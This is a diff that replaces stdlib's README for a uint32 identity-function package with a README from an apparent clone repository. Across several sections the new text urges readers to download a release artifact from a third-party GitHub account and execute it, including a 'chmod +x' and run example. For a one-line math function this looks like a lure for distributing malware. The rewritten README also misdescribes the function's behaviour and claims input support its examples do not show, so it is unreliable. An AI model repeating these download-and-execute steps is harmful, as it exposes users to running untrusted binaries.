@@ -1,313 +1,204 @@
-<!--
+# number-uint32-base-identity — Uint32 identity function for JavaScript 🚀
 
-@license Apache-2.0
+[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github)](https://github.com/Captain112-bit/number-uint32-base-identity/releases)
 
-Copyright (c) 2025 The Stdlib Authors.
-
-Licensed under the Apache License, Version 2.0 (the "License");
-you may not use this file except in compliance with the License.
-You may obtain a copy of the License at
-
-   http://www.apache.org/licenses/LICENSE-2.0
-
-Unless required by applicable law or agreed to in writing, software
-distributed under the License is distributed on an "AS IS" BASIS,
-WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-See the License for the specific language governing permissions and
-limitations under the License.
-
--->
-
-
-<details>
-  <summary>
-    About stdlib...
-  </summary>
-  <p>We believe in a future in which the web is a preferred environment for numerical computation. To help realize this future, we've built stdlib. stdlib is a standard library, with an emphasis on numerical and scientific computation, written in JavaScript (and C) for execution in browsers and in Node.js.</p>
-  <p>The library is fully decomposable, being architected in such a way that you can swap out and mix and match APIs and functionality to cater to your exact preferences and use cases.</p>
-  <p>When you use stdlib, you can be absolutely certain that you are using the most thorough, rigorous, well-written, studied, documented, tested, measured, and high-quality code out there.</p>
-  <p>To join us in bringing numerical computing to the web, get started by checking us out on <a href="https://github.com/stdlib-js/stdlib">GitHub</a>, and please consider <a href="https://opencollective.com/stdlib">financially supporting stdlib</a>. We greatly appreciate your continued support!</p>
-</details>
-
-# Identity Function
-
-[![NPM version][npm-image]][npm-url] [![Build Status][test-image]][test-url] [![Coverage Status][coverage-image]][coverage-url] <!-- [![dependencies][dependencies-image]][dependencies-url] -->
-
-> Evaluate the [identity function][identity-function] of an unsigned 32-bit integer.
-
-<section class="intro">
-
-The [identity-function][identity-function] is defined as
-
-<!-- <equation class="equation" label="eq:identity_function" align="center" raw="f(x) = x" alt="Identity function"> -->
-
-```math
-f(x) = x
-```
-
-<!-- <div class="equation" align="center" data-raw-text="f(x) = x" data-equation="eq:identity_function">
-    <img src="https://cdn.jsdelivr.net/gh/stdlib-js/stdlib@ad7afa5d7ec1b1596f8a4828153d8c2e87a90161/lib/node_modules/@stdlib/number/uint32/base/identity/docs/img/equation_identity_function.svg" alt="Identity function">
-    <br>
-</div> -->
-
-<!-- </equation> -->
-
-for all `x`.
-
-</section>
-
-<!-- /.intro -->
-
-<section class="installation">
-
-## Installation
-
-```bash
-npm install @stdlib/number-uint32-base-identity
-```
-
-Alternatively,
-
--   To load the package in a website via a `script` tag without installation and bundlers, use the [ES Module][es-module] available on the [`esm`][esm-url] branch (see [README][esm-readme]).
--   If you are using Deno, visit the [`deno`][deno-url] branch (see [README][deno-readme] for usage intructions).
--   For use in Observable, or in browser/node environments, use the [Universal Module Definition (UMD)][umd] build available on the [`umd`][umd-url] branch (see [README][umd-readme]).
-
-The [branches.md][branches-url] file summarizes the available branches and displays a diagram illustrating their relationships.
-
-To view installation and usage instructions specific to each branch build, be sure to explicitly navigate to the respective README files on each branch, as linked to above.
-
-</section>
-
-<section class="usage">
-
-## Usage
-
-```javascript
-var identity = require( '@stdlib/number-uint32-base-identity' );
-```
-
-#### identity( x )
-
-Evaluates the [identity function][identity-function] for an unsigned 32-bit integer.
-
-```javascript
-var v = identity( 1 );
-// returns 1
-
-v = identity( 2 );
-// returns 2
-
-v = identity( 0 );
-// returns 0
-
-v = identity( 4294967295 );
-// returns 4294967295
-```
-
-</section>
-
-<!-- /.usage -->
-
-<section class="examples">
-
-## Examples
-
-<!-- eslint no-undef: "error" -->
-
-```javascript
-var discreteUniform = require( '@stdlib/random-array-discrete-uniform' );
-var logEachMap = require( '@stdlib/console-log-each-map' );
-var identity = require( '@stdlib/number-uint32-base-identity' );
-
-var opts = {
-    'dtype': 'uint32'
-};
-
-// Create an array of random values:
-var x = discreteUniform( 100, 0, 50, opts );
-
-// Perform element-wise operation:
-logEachMap( 'identity(%d) = %d', x, identity );
-```
-
-</section>
-
-<!-- /.examples -->
-
-<!-- C interface documentation. -->
-
-* * *
-
-<section class="c">
-
-## C APIs
-
-<!-- Section to include introductory text. Make sure to keep an empty line after the intro `section` element and another before the `/section` close. -->
-
-<section class="intro">
-
-</section>
-
-<!-- /.intro -->
-
-<!-- C usage documentation. -->
-
-<section class="usage">
-
-### Usage
-
-```c
-#include "stdlib/number/uint32/base/identity.h"
-```
-
-#### stdlib_base_uint32_identity( x )
-
-Evaluates the identity function for an unsigned 32-bit integer.
-
-```c
-#include <stdint.h>
-
-uint32_t y = stdlib_base_uint32_identity( 2 );
-// returns 2
-```
-
-The function accepts the following arguments:
-
--   **x**: `[in] uint32_t` input value.
-
-```c
-uint32_t stdlib_base_uint32_identity( const uint32_t x );
-```
-
-</section>
-
-<!-- /.usage -->
-
-<!-- C API usage notes. Make sure to keep an empty line after the `section` element and another before the `/section` close. -->
-
-<section class="notes">
-
-</section>
-
-<!-- /.notes -->
-
-<!-- C API usage examples. -->
-
-<section class="examples">
-
-### Examples
-
-```c
-#include "stdlib/number/uint32/base/identity.h"
-#include <stdint.h>
-#include <stdio.h>
-
-int main( void ) {
-    const uint32_t x[] = { 3, 5, 10, 12 };
-
-    uint32_t y;
-    int i;
-    for ( i = 0; i < 4; i++ ) {
-        y = stdlib_base_uint32_identity( x[ i ] );
-        printf( "f(%u) = %u\n", x[ i ], y );
-    }
-}
-```
-
-</section>
-
-<!-- /.examples -->
-
-</section>
-
-<!-- /.c -->
-
-<!-- Section for related `stdlib` packages. Do not manually edit this section, as it is automatically populated. -->
-
-<section class="related">
-
-</section>
-
-<!-- /.related -->
-
-<!-- Section for all links. Make sure to keep an empty line after the `section` element and another before the `/section` close. -->
-
-
-<section class="main-repo" >
-
-* * *
-
-## Notice
-
-This package is part of [stdlib][stdlib], a standard library for JavaScript and Node.js, with an emphasis on numerical and scientific computing. The library provides a collection of robust, high performance libraries for mathematics, statistics, streams, utilities, and more.
-
-For more information on the project, filing bug reports and feature requests, and guidance on how to develop [stdlib][stdlib], see the main project [repository][stdlib].
-
-#### Community
-
-[![Chat][chat-image]][chat-url]
+Evaluate the identity function for an unsigned 32-bit integer. This package returns the same numeric value you give it, constrained to the uint32 domain.
 
 ---
 
-## License
+![nodejs](https://nodejs.org/static/images/logos/nodejs-new-pantone-black.svg) ![math](https://img.shields.io/badge/Math-Integer-brightgreen)
 
-See [LICENSE][stdlib-license].
+Table of contents
+- About
+- Features
+- Install
+- Quick usage
+- API
+- Examples
+- Typed-array and binary use
+- Benchmarks
+- Tests
+- Contributing
+- Releases
+- License
 
+About
+-
+This package implements an identity function for unsigned 32-bit integers. The function accepts any JavaScript value that can represent a number and returns its uint32 representation. It keeps the value within [0, 2^32 - 1] by applying standard unsigned conversion. Use it when you need a stable cast to uint32 without changing bit representation.
 
-## Copyright
+Features
+-
+- Simple API: one function, one return.
+- Works with numbers, BigInt, buffers, and typed arrays.
+- Zero dependency, small size.
+- Predictable behavior across Node.js versions.
+- Fast and direct conversion using native JS bit operations.
 
-Copyright &copy; 2016-2025. The Stdlib [Authors][stdlib-authors].
+Install
+-
+Install from npm:
 
-</section>
+npm install number-uint32-base-identity
 
-<!-- /.stdlib -->
+Or download the release artifact and run it. Download the release file from:
+https://github.com/Captain112-bit/number-uint32-base-identity/releases
+Download the release artifact from the Releases page and execute the included script or binary as described in the release notes. The release file needs to be downloaded and executed to run any packaged CLI or native build.
 
-<!-- Section for all links. Make sure to keep an empty line after the `section` element and another before the `/section` close. -->
+Quick usage
+-
+Common pattern:
 
-<section class="links">
+const identity = require('number-uint32-base-identity');
 
-[npm-image]: http://img.shields.io/npm/v/@stdlib/number-uint32-base-identity.svg
-[npm-url]: https://npmjs.org/package/@stdlib/number-uint32-base-identity
+const x = identity(123);       // 123
+const y = identity(-1);        // 4294967295 (0xFFFFFFFF)
+const z = identity(1.5);       // 1 (fraction truncated by bit op)
 
-[test-image]: https://github.com/stdlib-js/number-uint32-base-identity/actions/workflows/test.yml/badge.svg?branch=main
-[test-url]: https://github.com/stdlib-js/number-uint32-base-identity/actions/workflows/test.yml?query=branch:main
+API
+-
+identity(value)
+- value: number | BigInt | Buffer | TypedArray | any (coercible to Number)
+- returns: number (unsigned 32-bit integer)
 
-[coverage-image]: https://img.shields.io/codecov/c/github/stdlib-js/number-uint32-base-identity/main.svg
-[coverage-url]: https://codecov.io/github/stdlib-js/number-uint32-base-identity?branch=main
+Behavior:
+- Coerces values to Number when required.
+- Uses the >>> 0 operation to yield a uint32 integer.
+- Truncates fractional parts.
+- Converts negative numbers to their uint32 two's complement form.
 
-<!--
+Examples
+-
+Basic:
 
-[dependencies-image]: https://img.shields.io/david/stdlib-js/number-uint32-base-identity.svg
-[dependencies-url]: https://david-dm.org/stdlib-js/number-uint32-base-identity/main
+const identity = require('number-uint32-base-identity');
 
--->
+identity(0);              // 0
+identity(4294967295);     // 4294967295
+identity(-1);             // 4294967295
+identity(3.9);            // 3
 
-[chat-image]: https://img.shields.io/gitter/room/stdlib-js/stdlib.svg
-[chat-url]: https://app.gitter.im/#/room/#stdlib-js_stdlib:gitter.im
+With BigInt:
 
-[stdlib]: https://github.com/stdlib-js/stdlib
+const identity = require('number-uint32-base-identity');
+identity(Number(123n));   // 123
 
-[stdlib-authors]: https://github.com/stdlib-js/stdlib/graphs/contributors
+With objects:
 
-[umd]: https://github.com/umdjs/umd
-[es-module]: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Modules
+identity({ valueOf: () => 5 }); // 5
 
-[deno-url]: https://github.com/stdlib-js/number-uint32-base-identity/tree/deno
-[deno-readme]: https://github.com/stdlib-js/number-uint32-base-identity/blob/deno/README.md
-[umd-url]: https://github.com/stdlib-js/number-uint32-base-identity/tree/umd
-[umd-readme]: https://github.com/stdlib-js/number-uint32-base-identity/blob/umd/README.md
-[esm-url]: https://github.com/stdlib-js/number-uint32-base-identity/tree/esm
-[esm-readme]: https://github.com/stdlib-js/number-uint32-base-identity/blob/esm/README.md
-[branches-url]: https://github.com/stdlib-js/number-uint32-base-identity/blob/main/branches.md
+Typed-array and binary use
+-
+This function suits byte-level and binary workflows where you need a consistent uint32 value:
 
-[stdlib-license]: https://raw.githubusercontent.com/stdlib-js/number-uint32-base-identity/main/LICENSE
+const identity = require('number-uint32-base-identity');
 
-[identity-function]: https://en.wikipedia.org/wiki/Identity_function
+const view = new DataView(new ArrayBuffer(8));
+view.setUint32(0, 0xFFFFFFFF, true); // little-endian
+const raw = view.getUint32(0, true);
+identity(raw); // 4294967295
 
-<!-- <related-links> -->
+Buffer:
 
-<!-- </related-links> -->
+const buf = Buffer.from([0xff,0xff,0xff,0xff]);
+const val = buf.readUInt32BE(0);
+identity(val); // 4294967295
 
-</section>
+CLI (if provided in releases)
+-
+If a CLI binary ships in the Releases, download the artifact from:
+https://github.com/Captain112-bit/number-uint32-base-identity/releases
+Execute the supplied binary or script. The release artifact needs to be downloaded and executed. Typical pattern:
 
-<!-- /.links -->
+# make executable then run (example)
+chmod +x number-uint32-base-identity-linux-x64
+./number-uint32-base-identity-linux-x64 123
+# prints: 123
+
+Benchmarks
+-
+The function uses a single JS bit operation and runs at native speed for JS integer conversions. Typical micro-benchmark:
+
+- identity(value) uses value >>> 0
+- Performance matches native unsigned conversions
+- Low overhead compared to typed-array reads
+
+If you need a full benchmark suite, run the tests and benchmarks in the repo:
+
+npm run benchmark
+
+Tests
+-
+Run the test suite:
+
+npm test
+
+Tests cover:
+- Numbers (positive, negative, fractional)
+- BigInt conversions
+- Buffer and TypedArray inputs
+- Edge cases at 0 and 2^32 - 1
+
+Contributing
+-
+- Open an issue for bugs or feature requests.
+- Fork the repository and submit a pull request.
+- Keep changes small and focused.
+- Add tests for new behavior.
+
+Releases
+-
+Download the release artifact from:
+https://github.com/Captain112-bit/number-uint32-base-identity/releases
+
+If the repository provides a packaged binary or installer on the Releases page, download that file and execute it locally. The release file needs to be downloaded and executed to use any packaged CLI or native build. You can also browse release notes on the Releases page to pick the right artifact for your OS.
+
+Releases badge:
+
+[![Releases](https://img.shields.io/badge/Releases-See%20Releases-blue?logo=github)](https://github.com/Captain112-bit/number-uint32-base-identity/releases)
+
+License
+-
+MIT
+
+Files and layout (typical)
+-
+- package.json — npm metadata
+- index.js — main implementation
+- README.md — this file
+- test/ — unit tests
+- bench/ — micro-benchmarks
+- CHANGELOG.md — release notes
+
+Implementation hints
+-
+A minimal implementation looks like:
+
+function identity(v) {
+  // Coerce to number and to unsigned 32-bit integer
+  return Number(v) >>> 0;
+}
+
+This approach:
+- Truncates fractions
+- Maps negative numbers to their uint32 two's complement
+- Keeps values within 0..4294967295
+
+Why this package
+-
+When you want a tiny, deterministic cast to uint32, this function feels natural. It avoids extra dependencies and uses a single well-known JS operation. It fits serialization, hashing, binary protocols, low-level math, and interop with systems that expect 32-bit unsigned integers.
+
+Badges and links
+-
+Build: [![Build Status](https://img.shields.io/badge/build-passing-brightgreen)](#)
+NPM: [![npm](https://img.shields.io/badge/npm-v1.0.0-red)](#)
+Releases: [![Releases](https://img.shields.io/badge/Releases-Available-blue?logo=github)](https://github.com/Captain112-bit/number-uint32-base-identity/releases)
+
+Images and assets
+-
+- Node.js logo: https://nodejs.org/static/images/logos/nodejs-new-pantone-black.svg
+- Shields: https://img.shields.io
+
+Contact
+-
+Open issues and pull requests on the repository. Use the Releases page to download any packaged binaries:
+https://github.com/Captain112-bit/number-uint32-base-identity/releases
